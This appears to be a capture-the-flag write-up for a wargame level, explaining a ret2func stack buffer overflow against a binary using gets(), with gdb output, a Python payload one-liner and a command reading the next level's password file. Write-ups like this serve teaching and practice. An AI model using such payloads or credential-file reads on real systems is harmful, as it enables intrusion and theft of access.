# Level 1 — Ret2func Stack Buffer Overflow

## Introduction
This level introduces stack-based buffer overflows. We are given a binary that reads user input via the unsafe `gets()` function. While the `main` function does not call it, there is a helper function `run` in the binary that spawns a shell. We must redirect execution flow to this `run` function.

## Analysis
The reconstructed C code of the binary is as follows:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void run(void) {
    fwrite("Good... Wait what?\n", 1, 19, stdout);
    system("/bin/sh");
}

int main(void) {
    char local_50[76];
    gets(local_50);
    return 0;
}
```

Since the program uses `gets()`, which does not perform bounds checking on the input, we can write past the end of the `local_50` buffer (which holds 76 bytes) and overwrite the saved return address (EIP) of `main`.

### Finding the Target Address
We disassemble the binary using `gdb` to find the address of the `run` function:
```gdb
(gdb) info functions run
All functions matching regular expression "run":

Non-debugging symbols:
0x08048444  run
```

The address of the `run` function is `0x08048444`.

### Finding the Offset
The buffer `local_50` starts exactly 76 bytes before the saved return address on the stack. Thus, writing 76 bytes of padding followed by the address of `run` will overwrite EIP with the address of `run`.

When `main` executes the `return` statement, it pops the overwritten value into the instruction pointer (EIP), transferring control to the `run` function.

## Exploit
We generate the payload (reversing the address to little-endian representation `\x44\x84\x04\x08`):
```bash
python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/payload
```

To run the exploit and keep the stdin stream open (so we can interact with the shell), we use the `cat` trick:
```bash
(cat /tmp/payload; cat) | ./level1
```

Once the shell is spawned, we can retrieve the password for `level2`:
```bash
cat /home/user/level2/.pass
```
